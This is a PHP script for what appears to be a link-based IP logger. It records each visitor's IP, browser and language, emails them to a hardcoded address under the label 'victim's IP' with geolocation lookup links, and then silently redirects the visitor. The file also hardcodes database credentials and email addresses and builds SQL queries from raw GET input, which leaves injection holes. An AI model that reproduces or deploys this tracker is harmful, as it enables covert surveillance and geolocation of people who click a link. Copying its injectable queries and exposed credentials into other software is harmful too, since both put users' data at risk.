<?php
session_start();
	if(!($db = mysqli_connect('db21.freehost.com.ua', 'cybergard_vds', 'uUb8clVI1','cybergard_kabinet')))
	{
		echo "<p>Ошибка при подключении к базе данных. Оповестите пожалуйста администратора.</p>";
		exit();
	}
	mysqli_query($db,"SET NAMES utf8");

	$date = date("Y-m-d H:i:s");
	$idr = $_GET['id'];
	$rout = $_GET['rout'];
	$way = $_GET['way'];
	$session_room_id = $_SESSION['logged_user']['id'];

	//var_dump ($_GET);
	//var_dump ($rout);
	//echo $_SERVER('REQUEST_URI');

	//проверяем
	//echo $_SERVER['PHP_SELF'];
	//echo $way;
	//echo $idr;

if (isset ($idr))	{
	$result = mysqli_query($db," select * from rooms WHERE id='{$idr}'");
}
else if (isset ($way)) {
	$result = mysqli_query($db," select * from rooms WHERE  way='{$way}'");
}

if(count($result) != 0) {
	$room = mysqli_fetch_array($result);
	$result->Close();
}
else {
	$result = mysqli_query($db," select * from rooms WHERE id='{$session_room_id}' ");
	$room = mysqli_fetch_array($result);
	$result->Close();
}

//var_dump ($room);


//Добавляем в базу запись
if(isset($_SERVER['HTTP_USER_AGENT']) && isset($_SERVER['REMOTE_ADDR']) and $room['id'] != 2 )
{
	/*Заноосим данные в базу*/
	$result = mysqli_query($db,"insert into visitor (ip,room_id,sys_info,lang,time,url_to) values('{$_SERVER["REMOTE_ADDR"]}','{$room['id']}','{$_SERVER["HTTP_USER_AGENT"]}','{$_SERVER["HTTP_ACCEPT_LANGUAGE"]}','{$date}','{$room['url_to']}')");
	if($result == 'true') {
		//echo "<p>Ваша запись успешно добавлена!</p>";
	}
	else{
		//"<p>Ваша запись не добавлена!</p>";
	}



	/* Отправляем письмо на почту! */
	$message ="<table id='table900' bordercolor='#900' border='1' style='width:100%; border: 1px solid #900; '>
				<tr>
					<td>идентификатор  комнаты:</td>
					<td>ip жертвы:</td>
					<td>sys info:</td>
					<td>Язык интерфейса:</td>
					<td>Был перенаправлен:</td>
					<td>Время перехода</td>
				</tr>
				<tr>
					<td width='10%'>{$room['id']}</td>
					<td>
						{$_SERVER['REMOTE_ADDR']}
						<!-- <br><a target=\"_blank\" href=\"http://api.2ip.com.ua/provider.xml?ip={$_SERVER["REMOTE_ADDR"]}\" >Провайдер</a> -->

						<br><a  href=\"http://api.2ip.com.ua/provider.xml?ip={$_SERVER['REMOTE_ADDR']}\" onclick=\"window.open(this.href, 'windowName', 'width=500, height=500, left=340, top=64, scrollbars, resizable'); return false;\">Провайдер</a>
						<br><a onclick=\"window.open(this.href, 'windowName', 'width=500, height=500, left=340, top=64, scrollbars, resizable'); return false;\" href=\"http://api.2ip.com.ua/geo.xml?ip={$_SERVER['REMOTE_ADDR']}\">Местонахождение</a>
					</td>
					<td>{$_SERVER["HTTP_USER_AGENT"]}</td>
					<td>{$_SERVER['HTTP_ACCEPT_LANGUAGE']}</td>
					<td width='40%'><!--noindex-->{$room['url_to']}<!--/noindex--></td>
					<td>{$date}</td>

				</tr>
				</table>
				";
	$to = 'an95ew@gmail.com';
	//$to = $room['email']

	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: cyber.androsh@gmail.com";
	$headers .= "Reply-To: cyber.androsh@gmail.com\r\n";

	mail($to, "Прошла  по ссылке, комната №".$room['id'], $message,
	$headers."IP-Паутина: my@ip.info");
}
else
{
	//echo "<p>Не вся информация, категория не может быть добавлена в базу.</p>";
}





header("HTTP/1.1 301 Moved Permanently");
//echo ($room['name']);
//header("Location: https://www.youtube.com/{$room['way']}");
header("Location: {$room['url_to']}");
